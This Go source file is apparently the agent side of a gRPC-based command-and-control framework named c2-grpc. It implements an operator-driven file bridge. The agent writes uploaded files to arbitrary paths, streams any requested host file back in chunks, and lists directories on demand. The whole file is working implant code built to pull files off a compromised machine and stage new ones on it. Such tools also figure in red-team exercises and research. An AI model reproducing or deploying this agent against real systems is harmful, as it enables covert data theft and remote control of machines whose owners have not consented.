package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"

	pb "github.com/ardhptr21/c2-grpc/pb"
)

func startFileBridge(ctx context.Context, cancel context.CancelCauseFunc, client pb.FileServiceClient, agentID string) {
	stream, err := client.AgentTransfer(ctx)
	if err != nil {
		cancel(fmt.Errorf("server connection lost: file stream error: %w", err))
		return
	}

	sendMu := &sync.Mutex{}
	sendEvent := func(event *pb.AgentFileEvent) error {
		sendMu.Lock()
		defer sendMu.Unlock()
		return stream.Send(event)
	}

	if err := sendEvent(&pb.AgentFileEvent{
		Type:    "register",
		AgentId: agentID,
	}); err != nil {
		cancel(fmt.Errorf("server connection lost: file register error: %w", err))
		return
	}

	uploads := make(map[string]*uploadTarget)
	var uploadsMu sync.Mutex

	closeUpload := func(transferID string) {
		uploadsMu.Lock()
		target := uploads[transferID]
		delete(uploads, transferID)
		uploadsMu.Unlock()
		if target != nil && target.file != nil {
			_ = target.file.Close()
		}
	}

	defer func() {
		uploadsMu.Lock()
		ids := make([]string, 0, len(uploads))
		for transferID := range uploads {
			ids = append(ids, transferID)
		}
		uploadsMu.Unlock()
		for _, transferID := range ids {
			closeUpload(transferID)
		}
	}()

	for {
		req, err := stream.Recv()
		if err == io.EOF || ctx.Err() != nil {
			return
		}
		if err != nil {
			cancel(fmt.Errorf("server connection lost: file recv error: %w", err))
			return
		}

		switch req.GetType() {
		case "upload_start":
			if req.GetTransferId() == "" || req.GetPath() == "" {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       req.GetPath(),
					Message:    "transfer_id and path are required",
				})
				continue
			}
			targetPath, err := resolveUploadTargetPath(req.GetPath(), req.GetMessage())
			if err != nil {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       req.GetPath(),
					Message:    err.Error(),
				})
				continue
			}
			if err := os.MkdirAll(filepath.Dir(targetPath), 0o755); err != nil {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       targetPath,
					Message:    err.Error(),
				})
				continue
			}
			f, err := os.Create(targetPath)
			if err != nil {
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       targetPath,
					Message:    err.Error(),
				})
				continue
			}
			uploadsMu.Lock()
			uploads[req.GetTransferId()] = &uploadTarget{
				file:       f,
				path:       targetPath,
				totalBytes: req.GetTotalBytes(),
			}
			uploadsMu.Unlock()
		case "upload_chunk":
			uploadsMu.Lock()
			target := uploads[req.GetTransferId()]
			if target == nil || target.file == nil {
				uploadsMu.Unlock()
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       req.GetPath(),
					Message:    "upload not initialized",
				})
				continue
			}
			n, err := target.file.Write(req.GetData())
			if err != nil {
				uploadsMu.Unlock()
				closeUpload(req.GetTransferId())
				_ = sendEvent(&pb.AgentFileEvent{
					Type:       "error",
					TransferId: req.GetTransferId(),
					AgentId:    agentID,
					Path:       target.path,
					Message:    err.Error(),
				})
				continue
			}
			target.transferredBytes += int64(n)
			progress := target.transferredBytes
			total := target.totalBytes
			path := target.path
			uploadsMu.Unlock()
			_ = sendEvent(&pb.AgentFileEvent{
				Type:             "upload_progress",
				TransferId:       req.GetTransferId(),
				AgentId:          agentID,
				Path:             path,
				TotalBytes:       total,
				TransferredBytes: progress,
			})
		case "upload_end":
			uploadsMu.Lock()
			target := uploads[req.GetTransferId()]
			uploadsMu.Unlock()
			closeUpload(req.GetTransferId())
			finalPath := req.GetPath()
			totalBytes := int64(0)
			transferredBytes := int64(0)
			if target != nil {
				finalPath = target.path
				totalBytes = target.totalBytes
				transferredBytes = target.transferredBytes
			}
			_ = sendEvent(&pb.AgentFileEvent{
				Type:             "upload_done",
				TransferId:       req.GetTransferId(),
				AgentId:          agentID,
				Path:             finalPath,
				Message:          "upload completed",
				TotalBytes:       totalBytes,
				TransferredBytes: transferredBytes,
			})
		case "download":
			go streamDownload(sendEvent, req, agentID)
		case "list":
			go listDirectory(sendEvent, req, agentID)
		case "cancel":
			closeUpload(req.GetTransferId())
		}
	}
}

func streamDownload(sendEvent func(*pb.AgentFileEvent) error, req *pb.OperatorFileRequest, agentID string) {
	f, err := os.Open(req.GetPath())
	if err != nil {
		_ = sendEvent(&pb.AgentFileEvent{
			Type:       "error",
			TransferId: req.GetTransferId(),
			AgentId:    agentID,
			Path:       req.GetPath(),
			Message:    err.Error(),
		})
		return
	}
	defer f.Close()

	info, err := f.Stat()
	if err != nil {
		_ = sendEvent(&pb.AgentFileEvent{
			Type:       "error",
			TransferId: req.GetTransferId(),
			AgentId:    agentID,
			Path:       req.GetPath(),
			Message:    err.Error(),
		})
		return
	}

	totalBytes := info.Size()
	var transferredBytes int64
	buf := make([]byte, 32*1024)
	for {
		n, err := f.Read(buf)
		if n > 0 {
			transferredBytes += int64(n)
			if sendErr := sendEvent(&pb.AgentFileEvent{
				Type:             "download_chunk",
				TransferId:       req.GetTransferId(),
				AgentId:          agentID,
				Path:             req.GetPath(),
				Data:             append([]byte(nil), buf[:n]...),
				TotalBytes:       totalBytes,
				TransferredBytes: transferredBytes,
			}); sendErr != nil {
				return
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			_ = sendEvent(&pb.AgentFileEvent{
				Type:       "error",
				TransferId: req.GetTransferId(),
				AgentId:    agentID,
				Path:       req.GetPath(),
				Message:    err.Error(),
			})
			return
		}
	}

	_ = sendEvent(&pb.AgentFileEvent{
		Type:             "download_done",
		TransferId:       req.GetTransferId(),
		AgentId:          agentID,
		Path:             req.GetPath(),
		Message:          "download completed",
		TotalBytes:       totalBytes,
		TransferredBytes: transferredBytes,
	})
}

func listDirectory(sendEvent func(*pb.AgentFileEvent) error, req *pb.OperatorFileRequest, agentID string) {
	listPath := strings.TrimSpace(req.GetPath())
	if listPath == "" {
		listPath = "."
	}

	entries, err := os.ReadDir(listPath)
	if err != nil {
		_ = sendEvent(&pb.AgentFileEvent{
			Type:       "error",
			TransferId: req.GetTransferId(),
			AgentId:    agentID,
			Path:       listPath,
			Message:    err.Error(),
		})
		return
	}

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		fullPath := filepath.Join(listPath, entry.Name())
		if sendErr := sendEvent(&pb.AgentFileEvent{
			Type:       "list_entry",
			TransferId: req.GetTransferId(),
			AgentId:    agentID,
			Path:       fullPath,
			Message:    entry.Name(),
			IsDir:      entry.IsDir(),
			Size:       info.Size(),
			ModifiedAt: info.ModTime().UnixMilli(),
		}); sendErr != nil {
			return
		}
	}

	_ = sendEvent(&pb.AgentFileEvent{
		Type:       "list_done",
		TransferId: req.GetTransferId(),
		AgentId:    agentID,
		Path:       listPath,
		Message:    "directory listed",
	})
}

func resolveUploadTargetPath(targetPath, sourceName string) (string, error) {
	targetPath = strings.TrimSpace(targetPath)
	if targetPath == "" {
		return "", fmt.Errorf("target path is required")
	}

	info, err := os.Stat(targetPath)
	if err == nil && info.IsDir() {
		name := filepath.Base(strings.TrimSpace(sourceName))
		if name == "." || name == string(filepath.Separator) || name == "" {
			return "", fmt.Errorf("source filename is required for directory upload")
		}
		return filepath.Join(targetPath, name), nil
	}
	if err != nil && !errors.Is(err, os.ErrNotExist) {
		return "", err
	}
	if strings.HasSuffix(targetPath, string(filepath.Separator)) {
		name := filepath.Base(strings.TrimSpace(sourceName))
		if name == "." || name == string(filepath.Separator) || name == "" {
			return "", fmt.Errorf("source filename is required for directory upload")
		}
		return filepath.Join(targetPath, name), nil
	}
	return targetPath, nil
}
